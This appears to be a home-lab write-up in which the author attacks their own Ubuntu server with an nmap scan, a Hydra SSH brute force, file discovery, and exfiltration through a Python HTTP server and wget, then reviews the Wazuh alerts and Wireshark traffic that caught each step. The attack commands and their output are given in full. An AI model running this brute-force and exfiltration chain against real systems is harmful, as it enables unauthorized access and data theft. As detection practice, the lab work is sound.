---
layout: default
---

# TECH-BUREAU SERIES

## Phase 01: RECON/BRUTEFORCE/EXFILTRATION

<span class="h4-style">**Platform:**</span> https://www.malware-traffic-analysis.net/<br>
<span class="h4-style">**Pcap File:**</span> 2025-01-22-traffic-analysis-exercise.pcap

## Briefing:

... 

## Server Recognisence Using nmap
<pre data-label="nmap scan"><code>
<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ nmap -p 22,80,443,3306 TECH-BUREAU

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-21 16:11 CET
Nmap scan report for TECH-BUREAU (192.168.1.10)
Host is up (0.00061s latency).

PORT     STATE  SERVICE
22/tcp   <span class="orange"><strong>open</strong></span>   ssh
80/tcp   <span class="orange"><strong>closed</strong></span> http
443/tcp  <span class="orange"><strong>closed</strong></span> https
3306/tcp <span class="orange"><strong>open</strong></span>   mysql

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
</code></pre>
---

## SSH credential Hydra Attack
<pre data-label="hydra bruteforce"><code>
<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ hydra -l intern -P ROCK_YOU_10.txt ssh://TECH-BUREAU

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
Hydra starting at 2026-02-21 16:12:15
[WARNING] Many SSH configurations limit the number of parallel tasks
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
[DATA] attacking ssh://TECH-BUREAU:22/

[22][ssh] host: <span class="orange"><strong>TECH-BUREAU</strong></span>   login: <span class="orange"><strong>intern</strong></span>   password: <span class="orange"><strong>football</strong></span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-02-21 16:12:21
</code></pre>
---

## SSH IN TO THE SERVER
<pre data-label="SSH"><code>
<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ ssh intern@TECH-BUREAU
intern@tech-bureau's password:<span class="orange"><strong>football</strong></span>
</code></pre>
---

## TARGET FILE SEARCH
<pre data-label="find the specs"><code>
<span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home$ find . -type f -name "Frame*"
find: ‘./lead_engineer/.cache’: Permission denied
find: ‘./lead_engineer/.local/share’: Permission denied
./lead_engineer/PROJECT.5527/<span class="red"><strong>Frame_specs.txt</strong></span>
find: ‘./lead_engineer/.ssh’: Permission denied
<span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home$ 
</code></pre>
---

## CHECK DIRECTORY AND CONCATINATE
<pre data-label="ls and cat"><code>
<span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ ls
<span class="red"><strong>Frame_specs.txt</strong></span>
<span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ cat Frame_specs.txt

Project 5527/T1 - experemental frame specs.

Locomotive weight with tender = 944.700 pounds.
The original frames is a casting.
The frame lenght = 64 feet.
The frame weight = 70,000 pounds.

IMPORTANT! The 4-4-4-4 wheel arrangement as an uncoupled 4-8-4.
The running gear is a smaller — four 10-foot main rods.

Result: less total weight, shorter cylinder stroke, and less wear and tear on parts.
</code></pre>
---

## ESTABLISHING A PYTHON SERVER
<pre data-label="http.server"><code>
<span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ python3 -m http.server 8000
  
Serving HTTP on 0.0.0.0 port <span class="orange"><strong>8000</strong></span> (http://0.0.0.0:8000/) ...
  
</code></pre>
---

## EXFILTRATE VIA ATTACK TERMINAL
<pre data-label="wget"><code>
<span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>~/BUREAU.01$ wget http://TECH-BUREAU:8000/Frame_specs.txt
--2026-02-21 16:23:12--  http://tech-bureau:8000/Frame_specs.txt
Resolving tech-bureau (tech-bureau)... 192.168.1.10
Connecting to tech-bureau (tech-bureau)|192.168.1.10|:8000... <span class="orange"><strong>connected.</strong></span>
HTTP request sent, awaiting response... <span class="orange"><strong>200 OK</strong></span>
Length: 398 [text/plain]
Saving to: ‘Frame_specs.txt’

Frame_specs.txt        <span class="orange"><strong>100%[==========================>]</strong></span>     398  --.-KB/s    in 0s      

2026-02-21 16:23:12 (12.0 MB/s) - <span class="red"><strong>‘Frame_specs.txt’</strong></span> saved [398/398]
  
</code></pre>
---

## LEAVE
<pre data-label="exit"><code>
<span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ exit
logout
Connection to tech-bureau closed.
<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$

</code></pre>
---



PHASE.01 – Noisy 
The initial Setup
The Ubuntu server is configured via auditctl to watch a specific file in derectory – PROJECT.5527, any interaction with the containing schematic file will raise an alert.
<<AUTDITCTL + LOCAL RULE>>
The server firewall iptables is also watching for any suspicious incoming trafic to the main ports to try and raise the alert in case of an outside port scan.
<<IPTABLES + LOCAL RULE>>
The First Attack
We check that the server is up by sending a ping. Servers Up.
<<PING>>
Next is to see the port status, we are going for 4 ports in this scenario.
<<NMAP>>
We confirm port 22 up, ssh brute force is attempted next, we use the username intern for this scenario and a custom top 10 RockYou passwords file. Hydra is used.
<<HYDRA>>
The bruteforce is successful, we have secured the credentials needed to ssh in to the server.
<<SSH>>
We are in, using the find command we search for the file Frame_specs.txt
<<FIND>>
File located, we take a look at the content using the cat command.
<<CAT>>
The exfiltration will be done using a simple http server and port 8000.
<<HTTP SERVER>>
The file is received, the ssh connection is closed. The attack is compleete.
<<EXFILTRATION + EXIT>>
The Defense
Here we see the series of custom Wazuh alerts that fiered during the attack.
<<WAZUH ALERTS>>
We can confirm the nmap scan on exactly 4 ports. I will point out the detail that to a [SYN] request ports 80 and 443 are giving out an immediate [RST, ACK] to a scan attempt proving that the ports are closed. Ports 22 and 3306 however give a sequence of  [SYN] → [SYN,ACK] → [ACK] → [RST,ACK] signifying a handshake and than a immediate drop from the portscanner.
Port Scan Confirmed
<<WIRESHARK NMAP>>
With the hydra bruteforce we can simply observe the time signature and notice that a burst of 10 SSH protocol requests to the Ubuntu Server happening at the same time, followed by a series of key exchanges.
Brute Force Confirmed
<<WIRESHARK HYDRA>> 
request details
<<WAZUH SSH AS INTERN>>

<<WAZUH CAT AS INTERN>>
<<WIRESHARK HTTP.SERVER>>
In the HTTP stream we can observe a connection handshake followed by a GET request for the Frame_specs file, followed by a [PHS,ACK] push, that's the moment our data is getting exfiltrated. We than see an http code 200 and a connection closing sequence of  [FIN,ACK] → [ACK] 2ice (graceful close).
